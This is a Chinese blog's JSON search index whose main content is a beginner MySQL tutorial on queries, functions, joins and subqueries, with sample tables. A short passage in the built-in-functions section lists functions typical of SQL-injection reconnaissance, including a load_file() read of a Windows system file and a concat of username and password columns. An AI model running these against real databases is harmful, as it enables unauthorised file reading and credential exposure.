{"meta":{"title":"忆 执 昔 来 的 旅 途","subtitle":"","description":"生活明朗 万物可爱 人间值得 未来可期","author":"xizhi-future","url":"https://xizhi-future.github.io","root":"/"},"pages":[{"title":"个人介绍","date":"2021-10-15T09:47:19.508Z","updated":"2021-10-15T09:47:19.508Z","comments":true,"path":"about/index.html","permalink":"https://xizhi-future.github.io/about/index.html","excerpt":"","text":"联系方式 Email：&#x31;&#51;&#x37;&#48;&#50;&#50;&#48;&#x32;&#52;&#x33;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#109; QQ：1370220243 个人信息 00后 现大学本科生 个人博客：https://xizhi-future.github.io Github：https://github.com/xizhi-future 描述 本人爱好广泛，琴棋书画、唱歌跳舞样样喜欢，样样都不精通； 一个文静的外表，一个向往技术流的心； 该博客里将会有个人的自学笔记，同时也可能会记录在生活当中的点点滴滴； 希望参观过我博客的网友们可以互相交流，交个朋友呀！"},{"title":"分类","date":"2021-05-23T16:03:00.000Z","updated":"2021-10-01T10:14:53.628Z","comments":false,"path":"categories/index.html","permalink":"https://xizhi-future.github.io/categories/index.html","excerpt":"","text":""},{"title":"随笔","date":"2021-10-01T11:20:52.000Z","updated":"2021-10-01T12:30:28.737Z","comments":false,"path":"essayists/index.html","permalink":"https://xizhi-future.github.io/essayists/index.html","excerpt":"","text":"影视有感 生活杂谈 音乐分享"},{"title":"标签","date":"2021-05-23T16:09:40.000Z","updated":"2021-10-01T10:14:25.513Z","comments":false,"path":"tags/index.html","permalink":"https://xizhi-future.github.io/tags/index.html","excerpt":"","text":""},{"title":"音乐","date":"2021-10-15T09:20:28.000Z","updated":"2021-10-15T09:57:10.687Z","comments":false,"path":"playist/index.html","permalink":"https://xizhi-future.github.io/playist/index.html","excerpt":"","text":""}],"posts":[{"title":"MYSQL基础全","slug":"MYSQL基础全","date":"2021-11-21T10:25:42.000Z","updated":"2021-11-21T10:27:16.464Z","comments":true,"path":"2021/11/21/MYSQL基础全/","link":"","permalink":"https://xizhi-future.github.io/2021/11/21/MYSQL%E5%9F%BA%E7%A1%80%E5%85%A8/","excerpt":"","text":"MYSQL 数据库一、基础知识sql，DB， DBMS 概念理解1234567DB：DataBase 数据库--在硬盘上以 **文件** 的形式存在DBMS：DataBase Management System 数据库管理系统常见的数据库管理系统：Oracle，Mysql，DB2，Sybase，SqlServerSQL：结构化查询语言，是一门标准通用的高级语言。标准的sql适合所有的数据库产品。注：sql 语句在执行的时候，首先在内部进行编译，然后才执行sql语句，它的编译由DBMS完成。三者关系：DBMS通过执行 sql 语句来操作 DB 当中的数据 表123456数据库的基本组成单元，所有的数据都以表格的形式组织一个表包括：行(data)：被称为 数据 / 记录列(column)：被称为 字段字段的属性：字段名，数据类型，相关的约束 二、SQL 语句分类： 1.**DQL(数据查询语言)**：查询语句，所有的 select 语句 2.**DML(数据操作语言)**：insert , delete , update , 对表中的 数据 进行 增删改 3.**DDL(数据定义语言)**：create , drop , alter 对表 结构 的 增删改 4.**TCL(事务控制语言)**：commit 提交数据，rollback 回滚数据 Transaction 5.**DCL(数据控制语言)**：grant 授权，revoke 撤销权限等 12345注：1.任何一条 sql语句 以`;`结尾2.sql语句 不区分大小写3.字段可参与数学运算4.字符串要用单引号引起来 三、 Mysql 常用命令123456789101112131415161718192021222324查库：show databases；建库：create database + 库名;删库：drop database + 库名;进入指定数据库：use + 库名；查看当前数据库中的表：show tables；查看其他数据库中的表：select tables from + 其它库中的表名;查看表的结构：desc + 表名; 查看创建表的语句：show create table + 表名;查列：select * from + 表名；查询当前使用的数据库：select database();查看数据库版本：select version();终止一条语句：\\c退出mysql: \\q(ctrl+c) quit exit 导入数据 12当希望导入一个 较大 的文件或者是想要批量的执行sql语句时，可以使用 mysql 中的 source 命令使用方法：source + 文件路径 四、增删改查 CRUD 增（Create）检索（Retrieve）修改（Update）删除（Delete） 五、常用内置函数1234567891011121314151617floor() #向下取整mysql&gt; select floor(&#x27;z&#x27;);+------------+| floor(&#x27;z&#x27;) |+------------+| 0 |+------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select floor(&#x27;1.23&#x27;);+---------------+| floor(&#x27;1.23&#x27;) |+---------------+| 1 |+---------------+1 row in set (0.00 sec) 1234567891011121314151617rand() #返回 0-1 之间的随机数mysql&gt; select rand();+----------------------+| rand() |+----------------------+| 0.032002185501160275 |+----------------------+1 row in set (0.00 sec)mysql&gt; select rand();+--------------------+| rand() |+--------------------+| 0.5766042141025925 |+--------------------+1 row in set (0.00 sec) 123left(&quot;welcome&quot;,3) # welright(&quot;hello&quot;,2) # loposition(&quot;m&quot; in &quot;welcome&quot;) # 6 12345678# 取 0-9 之间的随机整数select floor(rand()*10)+1;# 截取部分select left(&#x27;xxx@qq.com&#x27;,position(&#x27;@&#x27; in &#x27;xxx@qq.com&#x27;)-1); # xxx# 格式输出时间select date_format(now(),&#x27;%Y-%m-%d&#x27;); # 2021-11-21 1234567891011select @@datadir; # 返回数据库存储目录 D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\select @@version_compile_os; # 查看服务器操作系统 Win64select user(); # root@localhostselect current_user();select database();select version();select current_user();concat(username,&quot;--&quot;,password); 1select load_file(&quot;c:\\\\windows\\\\drivers\\\\etc\\\\hosts&quot;); 做练习的数据库，表的结构资源如下：https://pan.baidu.com/s/1iA47qGloJYrVriwF43QpMg提取码：65yv 1234567891011121314151617181920212223242526272829303132333435363738394041mysql&gt; show tables;+-------------------+| Tables_in_myworld |+-------------------+| dept | 部门表| emp | 员工表| salgrade | 工资等级表+-------------------+mysql&gt; desc dept;+--------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------+-------------+------+-----+---------+-------+| DEPTNO | int(2) | NO | PRI | NULL | | 部门编号| DNAME | varchar(14) | YES | | NULL | | 部门名称| LOC | varchar(13) | YES | | NULL | | 部门位置+--------+-------------+------+-----+---------+-------+mysql&gt; desc emp;+----------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| EMPNO | int(4) | NO | PRI | NULL | | 员工编号| ENAME | varchar(10) | YES | | NULL | | 员工姓名| JOB | varchar(9) | YES | | NULL | | 工作岗位| MGR | int(4) | YES | | NULL | | 上级领导编号| HIREDATE | date | YES | | NULL | | 入职日期| SAL | double(7,2) | YES | | NULL | | 月薪| COMM | double(7,2) | YES | | NULL | | 补助/津贴| DEPTNO | int(2) | YES | | NULL | | 部门编号+----------+-------------+------+-----+---------+-------+mysql&gt; desc salgrade;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| GRADE | int(11) | YES | | NULL | | 等级| LOSAL | int(11) | YES | | NULL | | 最低薪资| HISAL | int(11) | YES | | NULL | | 最高薪资+-------+---------+------+-----+---------+-------+ 多表查询DQL(数据查询语言)一、简单的查询语句 (DQL)12345678910111213141516171819语法格式：select 字段名1，字段名2，字段名3，......from + 表名；查询所有字段：select * from + 表名;给查询结果的列重命名：select 字段名 as 新名 from + 表名;select 字段名 新名 from + 表名;mysql&gt; select 1+2;+-----+| 1+2 |+-----+| 3 |+-----+1 row in set (0.00 sec)注：中文要用引号引起来(最好都使用单引号，由于双引号不通用)as 关键字可省略，用 空格 代替 二、条件查询12语法格式：select 字段1，字段2，...... from + 表名 where + 条件; 常用运算符 运算符 描述 = 等于 &lt;&gt; 或 != 不等于 &gt; 大于 &gt;= 大于等于 &lt; 小于 &lt;= 小于等于 is NULL 为NULL and 并且 or 或者 in 是否为这几个值 not 非，与is 和in 结合使用 like 模糊查询，支持%或下划线匹配 between...and... 一个范围，含边界 (前面数字必须小于等于后面的数字)，等价于 &gt;= and &lt;= between…and… 12345678例如：select * from users where id between 2 and 8; 等价于select * from users where id &gt;=2 and id &lt;=8;select * from users where id between 8 and 2; 是无效的注：between...and...可以用于字符串查询-左闭右开 例如：select username from users where username between &#x27;a&#x27; and &#x27;c&#x27;; 指查看a~b的信息 is NULL 与 is not NULL 123NULL与0的区别：数据库中 NULL 不是一个值，代表为空，不能使用 = 衡量；0 是一个值，并不为空。注：判断是否为NULL时，使用的是 is 或者是 is not,而不是 = 。 and 与 or 1and 的优先级高于 or, 必要时使用()括起来 in 与 not in 12345select password from users where id in(5,8);等价于select password from users where id=5 or id=8;指查找出 id=5 和 id=8 的用户的密码select password from users where id not in(5,8);指查找出 id不等于5 和 id不等于8 的用户的密码注：不是 5~8，in之后不是一个区间 like 12345678910111213两个特殊字符：1.% 代表任意多个字符2._ 代表任意一个字符例如：select username from users where username like &#x27;%b%&#x27;;指查找出用户名中带有字母b的用户名select username from users where username like &#x27;_a%&#x27;;指查找出用户名中带第二个字母为a的用户名select username from users where username like &#x27;%b&#x27;;指查找出用户名中带最后一个字母为b的用户名select username from users where username like &#x27;%\\_%&#x27;;指查找出用户名中带有下划线_的用户名注：特殊字符需要转义 三、数据排序123456789101112131415关键字：order by 指通过什么方式排序select username from users order by 字段名；注：默认为升序排列指定升序：ascselect username from users order by 字段名 asc；指定降序：descselect username from users order by 字段名 desc；双重需求：select username from users order by 字段名1 desc,字段名2 asc；指先按照 字段名1 降序排列，如果 字段名1 相同，则按照 字段名2 的升序排列select * from users order by &#x27;2&#x27;;按照这个表中 第二列 (第几个字段) 进行排序(默认升序) 12345678执行顺序：select 3号 字段from 1号 表名where 2号 条件order by...; 4号 四、分组函数（多行处理函数，聚合函数）123456789101112所有的分组函数都是对&quot;某一组&quot;数据进行操作的，输入多行，输出一行。count 计数sum 求和avg 求平均值max 最大值min 最小值举例：select sum(grade) from users;select avg(grade) from users;select max(grade) from users;select min(grade) from users;select count(*) from users; 五、单行处理函数1输入一行，输出一行 空处理函数12345当NULL参与数学运算(即包括加减乘除)时，需要空处理函数格式：ifnull(可能为NULL的数据，想要当作什么数据)例如：select sum(ifnull(salary,0)*12), from crew;求一年的薪水之和，当薪水为NULL时，被当作0来处理 六、注意点：count(*) 与 count(具体的某个字段)12count(*) :统计总记录条数，而不是统计某个字段中的数据，与字段无关count(具体的某个字段)：统计具体字段中不为NULL的总数 注：123451.字符串数据 sum,avg 为 0，max,min 按字母大小取2.分组函数会自动忽略 NULL3.数学运算 中如果有NULL参与，结果为定为NULL4.分组函数不能直接出现在 where 后面，原因是group by 是在where语句执行结束之后执行的5.分组函数可组合使用 举例：123456示例一：select sum(ifnull(grade,0)) from students;求成绩之和，当成绩为NULL时，被当作0来处理其实不需要ifnull()函数，因为分组函数会自动忽略NULL，直接写select sum(grade) from students; 即可分组函数 sum 会自动忽略NULL的grade，只计算非NULL的成绩和 123示例二：select sum(grade) from students where grade is not NULL;没有必要使用 where 过滤 123456789示例三：select id from students where grade &gt; avg(grade);无效的使用了分组函数，将会报错，因为 sql语句 规定分组函数不能出现在 where 后面 解决方案：方案一：分两步select avg(grade) from students;select id from students where grade &gt;= 上面所求得的值;方案二：子查询（select语句中嵌套select语句）select id from students where grade &gt;= (select avg(grade) from students) 七、group by 与 having1234567891011group by：按照某个字段或某些字段进行分组having：对分组之后的数据进行再次过滤，即having 必须跟在 group by 后面使用select max(grade) from students group by classes;先根据班级分组，再查出各个班级的成绩最高学生的成绩注：分组函数一般与 group by 联合使用，并且任何一个分组函数（count,sum,avg,max,min）都是在 group by 语句执行结束后才会执行当一条sql语句没有 group by 时，整张表会自成一组当sql语句中使用group by时，select之后只能跟参与分组的字段或者分组函数注：实际上在 mysql 中，可以使用并且执行，但毫无意义；而由于 Oracle 比 Mysql 要更加严格，在 Oracle 中是绝对严格不能使用的。 多字段来联合分组12select id,grade from students group by classes,sex;先依次按照班级，性别进行分组，再查出分组之后学生的id与grade having 与 where1234567891011121314示例一：找到每个班级成绩大于等于700学生中的最高成绩，该案例使用 where 与 having 过滤均可select max(grade) from students group by classes having grade &gt;= 700;先进性班级分组，然后使用having 过滤select max(grade) from students where grade &gt;= 700 group by classes;先使用where进行条件过滤，然后再进行班级分组说明：两种方法均可，但是该示例中 where比having 的效率要高，因为 where 中参与分组的数据比 having 要少 示例二：找到每个班级成绩大于等于平均成绩的学生的学号，该案例只能使用 having 进行过滤select id from students group by classes having grade &gt;= avg(grade);使用 having 过滤，正确select id from students where grade &gt;= avg(grade) group by classes;使用 where语句过滤，错误，由于 where语句之后不能出现分组函数总结：能使用 where 最好使用 where ,只有当只能使用 having 才能满足需求时，再使用 having 。 八、查询结果集的去重1234567distinct 关键字 去除重复记录select distinct job from company;查询该公司中的工作岗位select count(distinct job) from company;统计该公司中工作岗位数量注：distinct 只能出现在所有字段的最前面，表示将后面的字段联合起来一起去重 九、一个完整的 sql语句 执行顺序1234567891011select 5号：挑选出满足条件的数据from 1号：定表where 2号：过滤原始数据group by 3号：进行分组 having 4号：对数据进行再次过滤order by 6号：进行排序 DML (数据操作语言)插入数据 insert 1insert into 表名(字段名1，字段名2，字段名3......) values(值1，值2，值3......)； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455注：字段的数据类型要与值对应，值的数量小于等于字段的数量，小于时，未被插入数据的字段为指定的默认值。例如：insert into t_stu(no,name) values(2007040202,&#x27;lijun&#x27;);mysql&gt; select * from t_stu;+------------+----------+------+-------+----------+| no | name | sex | birth | classno |+------------+----------+------+-------+----------+| 2007040201 | xiaoming | 1 | 2002 | 20070402 || 2007040202 | lijun | NULL | NULL | NULL |+------------+----------+------+-------+----------+当一条insert语句执行成功之后，表格中必然会多一行记录，即使为 NULL 也不能再使用 insert 进行插入，只能通过 update 进行更新。举例：insert into t_stu(sex,birth,classno) values(&#x27;1&#x27;,&#x27;2002&#x27;,&#x27;20070402&#x27;);mysql&gt; select * from t_stu;+------------+----------+------+-------+----------+| no | name | sex | birth | classno |+------------+----------+------+-------+----------+| 2007040201 | xiaoming | 1 | 2002 | 20070402 || 2007040202 | lijun | NULL | NULL | NULL || NULL | NULL | 1 | 2002 | 20070402 |+------------+----------+------+-------+----------+字段名可以省略，但是值是数量与顺序必须与字段的数量与顺序相对应举例： insert into t_stu values(2007040203,&#x27;zhangsan&#x27;,&#x27;1&#x27;,&#x27;2001&#x27;,&#x27;20070402&#x27;);mysql&gt; select * from t_stu;+------------+----------+------+-------+----------+| no | name | sex | birth | classno |+------------+----------+------+-------+----------+| 2007040201 | xiaoming | 1 | 2002 | 20070402 || 2007040202 | lijun | NULL | NULL | NULL || NULL | NULL | 1 | 2002 | 20070402 || 2007040203 | zhangsan | 1 | 2001 | 20070402 |+------------+----------+------+-------+----------+ insert into t_stu values(2007040203,&#x27;xiaohong&#x27;,&#x27;0&#x27;,&#x27;&#x27;,&#x27;&#x27;); mysql&gt; select * from t_stu;+------------+----------+------+-------+----------+| no | name | sex | birth | classno |+------------+----------+------+-------+----------+| 2007040201 | xiaoming | 1 | 2002 | 20070402 || 2007040202 | lijun | NULL | NULL | NULL || NULL | NULL | 1 | 2002 | 20070402 || 2007040203 | zhangsan | 1 | 2001 | 20070402 || 2007040203 | xiaohong | 0 | | |+------------+----------+------+-------+----------+insert 一次可插入多行数据insert into t_stu(no,name,sex,birth,classno) values(),(),()......; 修改数据 update 12语法：update 表名 set 字段名1=值1,字段名2=值2,......where 条件； 删除数据 delete 1234语法:delete from 表名 where 条件; #可回滚对于大表：truncate table 表名; #不可回滚，将会永久丢失 DDL(数据定义语言)表的创建 12345678910111213语法：create table 表名( 字段名1，数据类型， 字段名2，数据类型， 字段名3，数据类型， ......);查看创建表的语法：show create table + 表名;drop table if exists t1; Mysql 中常见的数据类型 1234567891011121314151617181920212223int 整型bigint 长整型smallintmediumintfloat 浮点型double char 定长字符串varchar 可变长字符串(最多存储255个字符)set 多选插入enum 单选插入textdata 日期类型yeartimestamptimedatetimeBLOB 二进制大对象(存储图片，视频等流媒体信息)CLOB 字符大对象(存储较大的文本) 测试：时间类型 123456789101112131415161718192021222324252627282930313233create table time( id int primary key auto_increment, myYear year, myTime time, myDate date, myDataTime datetime);mysql&gt; select now();+---------------------+| now() |+---------------------+| 2021-11-21 17:11:46 |+---------------------+1 row in set (0.00 sec)mysql&gt; select current_time();+----------------+| current_time() |+----------------+| 17:11:52 |+----------------+1 row in set (0.00 sec)insert into time(myYear,myTime,myDate,myDataTime) values(now(),now(),now(),now());mysql&gt; select * from time;+----+--------+----------+------------+---------------------+| id | myYear | myTime | myDate | myDataTime |+----+--------+----------+------------+---------------------+| 1 | 2021 | 17:14:06 | 2021-11-21 | 2021-11-21 17:14:06 |+----+--------+----------+------------+---------------------+1 row in set (0.00 sec) 测试：enum set 123456789101112131415161718192021222324252627create table table_enum( id int primary key auto_increment, aa enum(&quot;qqq&quot;,&quot;www&quot;,&quot;eee&quot;,&quot;qwer&quot;));正确测试：只能在 以上中选择数据进行插入，别的数据不可进行插入insert into table_enum(aa) values(&quot;qqq&quot;); #数字对应1 insert into table_enum(aa) values(&quot;www&quot;); #数字对应2 insert into table_enum(aa) values(&quot;eee&quot;); #数字对应3 错误测试：insert into table_enum(aa) values(&quot;zzz&quot;);insert into table_enum(aa) values(&quot;qqq,www&quot;);mysql&gt; insert into table_enum(aa) values(&quot;4&quot;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table_enum;+----+------+| id | aa |+----+------+| 1 | qqq || 2 | www || 3 | qwer |+----+------+3 rows in set (0.00 sec) 123456789create table table_set( id int primary key auto_increment, aa set(&quot;qqq&quot;,&quot;www&quot;,&quot;eee&quot;,&quot;qwer&quot;));insert into table_set(aa) values(&quot;qqq&quot;);insert into table_set(aa) values(&quot;www&quot;);insert into table_set(aa) values(&quot;3&quot;);insert into table_set(aa) values(&quot;qqq,www&quot;); char 与 varchar 的选择 解释：char(10):可以存储长度为110的字符串，不论所要存储的字符串长度为几，均固定划分10个空间去存储。也就是说，即使存储的字符串长度为4，也仍然会有6个空间剩余。**varchar(10)**：可以存储长度为110的字符串，区别在于，varchar可以根据存储的数据进行 动态分配空间，即如果存储的字符串长度为4，就只分配4个空间，没有剩余。 使用：当某个字段中的数据长度为定长时，采用char; 如果插入的数据大于本身定义的char大小，将会自动截断当某个字段中的数据长度不确定时，采用varchar char 查询速度 &gt; varchar 建议：建表时表明最好以t_或者tbl_开始 表的复制 1234将查询结果当作表创建出来：create table 表名 as select语句;将查询结果作为数据插入到表中：insert into 表名 select语句； 表的删除 12drop table if exists 表名; #Oracle不支持drop table 表名; #通用 扩展： 1234567891011121314151617181920# alter添加一列：mysql&gt; alter table time add column address varchar(255) not null default &#x27;&#x27;;Query OK, 1 row affected (0.03 sec)Records: 1 Duplicates: 0 Warnings: 0mysql&gt; select * from time;+----+--------+----------+------------+---------------------+---------+| id | myYear | myTime | myDate | myDataTime | address |+----+--------+----------+------------+---------------------+---------+| 1 | 2021 | 17:14:06 | 2021-11-21 | 2021-11-21 17:14:06 | |+----+--------+----------+------------+---------------------+---------+1 row in set (0.00 sec)# alter 删除一列：alter table time drop column address;#delete 对表的操作delete from time where id=1; #删除一列delete from time; #删除一整张表 内连接等值连接123456789101112特点：条件是等量关系语法：select frominner join #inner 可省略onwhere 12举例：select a.ename,b.dname from emp a join dept b on a.deptno=b.deptno; 非等值连接123456789101112特点：条件是非等量关系语法：select frominner join //inner 可省略on...between...and...where 示例：找出每位员工对应的工资以及相应的工资等级 12345678910111213141516171819202122232425 select a.ename,a.sal,c.grade from emp a join salgrade c on a.sal &gt;= c.losal and a.sal &lt;= c.hisal; select a.ename,a.sal,c.grade from emp a join salgrade c on a.sal between c.losal and c.hisal;结果：mysql&gt; select a.ename,a.sal,c.grade from emp a join salgrade c on a.sal &gt;= c.losal and a.sal &lt;= c.hisal;+--------+---------+-------+| ename | sal | grade |+--------+---------+-------+| SMITH | 800.00 | 1 || ALLEN | 1600.00 | 3 || WARD | 1250.00 | 2 || JONES | 2975.00 | 4 || MARTIN | 1250.00 | 2 || BLAKE | 2850.00 | 4 || CLARK | 2450.00 | 4 || SCOTT | 3000.00 | 4 || KING | 5000.00 | 5 || TURNER | 1500.00 | 3 || ADAMS | 1100.00 | 1 || JAMES | 950.00 | 1 || FORD | 3000.00 | 4 || MILLER | 1300.00 | 2 |+--------+---------+-------+14 rows in set (0.00 sec) 自连接1特点：一张表看作两张表，自己连接自己 示例：找出每位员工对应的上级领导名称 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556员工编号，员工名，上级领导编号：mysql&gt; select empno,ename,mgr from emp;+-------+--------+------+| empno | ename | mgr |+-------+--------+------+| 7369 | SMITH | 7902 || 7499 | ALLEN | 7698 || 7521 | WARD | 7698 || 7566 | JONES | 7839 || 7654 | MARTIN | 7698 || 7698 | BLAKE | 7839 || 7782 | CLARK | 7839 || 7788 | SCOTT | 7566 || 7839 | KING | NULL || 7844 | TURNER | 7698 || 7876 | ADAMS | 7788 || 7900 | JAMES | 7698 || 7902 | FORD | 7566 || 7934 | MILLER | 7782 |+-------+--------+------+14 rows in set (0.00 sec)将该表看作两张表：员工表：emp a| (员工名)|(对应上级领导编号)|+--------+------+| ename | mgr |+--------+------+| SMITH | 7902 || ALLEN | 7698 || WARD | 7698 || JONES | 7839 || MARTIN | 7698 || BLAKE | 7839 || CLARK | 7839 || SCOTT | 7566 || KING | NULL || TURNER | 7698 || ADAMS | 7788 || JAMES | 7698 || FORD | 7566 || MILLER | 7782 |+--------+------+领导表：emp b|(领导编号)|(领导名)|+-------+--------+| empno | ename | +-------+--------+| 7902 | FORD || 7698 | BLAKE | | 7839 | KING || 7566 | JONES || 7788 | SCOTT | | 7782 | CLARK | 1234567891011121314151617181920自连接查询：条件：员工表中员工的上级领导编号等于领导表中领导的领导编号mysql&gt; select a.ename as &#x27;员工名&#x27;,b.ename as &#x27;领导名&#x27; from emp a join emp b on a.mgr=b.empno;+-----------+-----------+| 员工名 | 领导名 |+-----------+-----------+| SMITH | FORD || ALLEN | BLAKE || WARD | BLAKE || JONES | KING || MARTIN | BLAKE || BLAKE | KING || CLARK | KING || SCOTT | JONES || TURNER | BLAKE || ADAMS | SCOTT || JAMES | BLAKE || FORD | JONES || MILLER | CLARK |+-----------+-----------+13 rows in set (0.00 sec) 外连接 外连接：A表与B表进行连接，AB两张表中一张为主表，一张为副表，主要查询的是主表中的数据，当副表中的数据不能与主表中的数据匹配时，副表会自动模拟出 NULL 与之匹配。内连接：A表与B表进行连接，将两张表中能够匹配的数据查出来，不能匹配的数据忽略不计。AB两张表没有主次之分，是平等的。 123456789101112特点：查询占主导地位的表，捎带着查询副表中的数据，当副表中数据与之不匹配时，自动以 NULL 替换，不会丢失主表中的数据。语法：select from left/right outer join //outer 可省略on where 123注：left表示左连接，即左边占主导地位right表示右连接，即右边占指导地位 示例：找出哪一个部门没有员工 123456789101112131415161718192021222324252627282930mysql&gt; select dname,ename from dept a left join emp b on a.deptno=b.deptno;+------------+--------+| dname | ename |+------------+--------+| RESEARCH | SMITH || SALES | ALLEN || SALES | WARD || RESEARCH | JONES || SALES | MARTIN || SALES | BLAKE || ACCOUNTING | CLARK || RESEARCH | SCOTT || ACCOUNTING | KING || SALES | TURNER || RESEARCH | ADAMS || SALES | JAMES || RESEARCH | FORD || ACCOUNTING | MILLER || OPERATIONS | NULL |+------------+--------+15 rows in set (0.00 sec)mysql&gt; select dname,ename from dept a left join emp b on a.deptno=b.deptno where b.ename is NULL;+------------+-------+| dname | ename |+------------+-------+| OPERATIONS | NULL |+------------+-------+1 row in set (0.00 sec) 多表查询12345678语法：select fromjoin...on...join...on...join...on... where 123456举例理解：select a.ename,b.dname,c.grade from emp a left join dept b on a.deptno=b.deptno join salgrade c on a.sal between c.losal and c.hisal;解释：emp a 先与 dept b 进行外连接查询，查询出之后的表再与 salgrade c 进行内连接查询。注：什么时候需要外连接查询，什么时候不需要，并且注意哪一张表作为主表，哪张表是副表，使用左连接与右连接要灵活。 示例一：找出每位员工的部门名称和工资等级 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576员工部门编号，员工名称，月薪：mysql&gt; select empno,ename,sal from emp;+-------+--------+---------+| empno | ename | sal |+-------+--------+---------+| 7369 | SMITH | 800.00 || 7499 | ALLEN | 1600.00 || 7521 | WARD | 1250.00 || 7566 | JONES | 2975.00 || 7654 | MARTIN | 1250.00 || 7698 | BLAKE | 2850.00 || 7782 | CLARK | 2450.00 || 7788 | SCOTT | 3000.00 || 7839 | KING | 5000.00 || 7844 | TURNER | 1500.00 || 7876 | ADAMS | 1100.00 || 7900 | JAMES | 950.00 || 7902 | FORD | 3000.00 || 7934 | MILLER | 1300.00 |+-------+--------+---------+14 rows in set (0.00 sec)部门编号，部门名称：mysql&gt; select deptno,dname from dept;+--------+------------+| deptno | dname |+--------+------------+| 10 | ACCOUNTING || 20 | RESEARCH || 30 | SALES || 40 | OPERATIONS |+--------+------------+4 rows in set (0.00 sec)mysql&gt; select a.ename,b.dname from emp a left join dept b on a.deptno=b.deptno;+--------+------------+| ename | dname |+--------+------------+| CLARK | ACCOUNTING || KING | ACCOUNTING || MILLER | ACCOUNTING || SMITH | RESEARCH || JONES | RESEARCH || SCOTT | RESEARCH || ADAMS | RESEARCH || FORD | RESEARCH || ALLEN | SALES || WARD | SALES || MARTIN | SALES || BLAKE | SALES || TURNER | SALES || JAMES | SALES |+--------+------------+14 rows in set (0.00 sec)mysql&gt; select a.ename,b.dname,c.grade from emp a left join dept b on a.deptno=b.deptno join salgrade c on a.sal between c.losal and c.hisal;+--------+------------+-------+| ename | dname | grade |+--------+------------+-------+| SMITH | RESEARCH | 1 || ALLEN | SALES | 3 || WARD | SALES | 2 || JONES | RESEARCH | 4 || MARTIN | SALES | 2 || BLAKE | SALES | 4 || CLARK | ACCOUNTING | 4 || SCOTT | RESEARCH | 4 || KING | ACCOUNTING | 5 || TURNER | SALES | 3 || ADAMS | RESEARCH | 1 || JAMES | SALES | 1 || FORD | RESEARCH | 4 || MILLER | ACCOUNTING | 2 |+--------+------------+-------+14 rows in set (0.00 sec) 示例二：出每位员工的部门名称，工资等级，以及上级领导 1234567891011121314151617181920mysql&gt; select a.ename as &#x27;员工名&#x27;,b.ename as &#x27;领导名&#x27;,c.dname,d.grade from emp a left join emp b on a.mgr=b.empno join dept c on a.deptno=c.deptno join salgrade d on a.sal between d.losal and d.hisal;+-----------+-----------+------------+-------+| 员工名 | 领导名 | dname | grade |+-----------+-----------+------------+-------+| SMITH | FORD | RESEARCH | 1 || ALLEN | BLAKE | SALES | 3 || WARD | BLAKE | SALES | 2 || JONES | KING | RESEARCH | 4 || MARTIN | BLAKE | SALES | 2 || BLAKE | KING | SALES | 4 || CLARK | KING | ACCOUNTING | 4 || SCOTT | JONES | RESEARCH | 4 || KING | NULL | ACCOUNTING | 5 || TURNER | BLAKE | SALES | 3 || ADAMS | SCOTT | RESEARCH | 1 || JAMES | BLAKE | SALES | 1 || FORD | JONES | RESEARCH | 4 || MILLER | CLARK | ACCOUNTING | 2 |+-----------+-----------+------------+-------+14 rows in set (0.00 sec) 连接查询 在实际开发中，一般一个业务会对应多张表，因此大部分情况下都不是从单表中查询数据，而是多张表联合查询数据从而取出最终的结果。这也是关系型数据库存在的原因。 分类 12345678根据年代划分：SQL92:旧的语法SQL99:较新的语法根据表的连接方式划分：内连接：分为等值连接，非等值连接，自连接外连接：分为左外连接（左连接），右外连接（右连接）全连接 笛卡尔积现象 (笛卡尔乘积现象) 现象：当两张表进行连接查询时，如果没有条件限制的话，最终查询结果条数将会是两张表记录条数的乘积。避免笛卡尔乘积现象：添加条件进行过滤取表的别名：提高执行效率，增强可读性 注：添加条件进行过滤并不会减少记录的匹配记录，仍然是两张表记录条数的乘积，只不过最终显示出来的是过滤之后的有效信息而已。 示例： 1找到每个员工的部门名称 1234567891011121314151617181920212223242526272829303132mysql&gt; select dname,deptno from dept;//部门名称以及部门编号+------------+--------+| dname | deptno |+------------+--------+| ACCOUNTING | 10 || RESEARCH | 20 || SALES | 30 || OPERATIONS | 40 |+------------+--------+4 rows in set (0.00 sec)mysql&gt; select ename,deptno from emp;//员工名称以及对应部门编号+--------+--------+| ename | deptno |+--------+--------+| SMITH | 20 || ALLEN | 30 || WARD | 30 || JONES | 20 || MARTIN | 30 || BLAKE | 30 || CLARK | 10 || SCOTT | 20 || KING | 10 || TURNER | 30 || ADAMS | 20 || JAMES | 30 || FORD | 20 || MILLER | 10 |+--------+--------+14 rows in set (0.00 sec) 1234使用：select ename,dname from emp,dept;查出来的结果为两张表记录条数的乘积，即14*4=56。过程：从员工表的第一位员工开始匹配，依次匹配四个部门而没有进行任何过滤，也就是说每一位员工均和四个部门进行了匹配。 进行 where 过滤： 1select a.ename,b.dname from emp a,dept b where a.deptno=b.deptno; 1234567891011121314151617181920212223结果为mysql&gt; select a.ename,b.dname from emp a,dept b where a.deptno=b.deptno;+--------+------------+| ename | dname |+--------+------------+| SMITH | RESEARCH || ALLEN | SALES || WARD | SALES || JONES | RESEARCH || MARTIN | SALES || BLAKE | SALES || CLARK | ACCOUNTING || SCOTT | RESEARCH || KING | ACCOUNTING || TURNER | SALES || ADAMS | RESEARCH || JAMES | SALES || FORD | RESEARCH || MILLER | ACCOUNTING |+--------+------------+14 rows in set (0.00 sec)不再有冗余 子查询1select语句 中嵌套 select语句，被嵌套 select语句即为子查询。 1234567语法：select ...(select...)from ...(select...)where ...(select...) where 后面嵌套 示例：找出高于平均薪资的员工 123456789101112mysql&gt; select ename,sal from emp where sal &gt; (select avg(sal) from emp );+-------+---------+| ename | sal |+-------+---------+| JONES | 2975.00 || BLAKE | 2850.00 || CLARK | 2450.00 || SCOTT | 3000.00 || KING | 5000.00 || FORD | 3000.00 |+-------+---------+6 rows in set (0.00 sec) from 后面嵌套 1将查询出来的表作为一张新表，与另一张表进行连接查询 示例：找出每个部门平均薪水的薪资等级 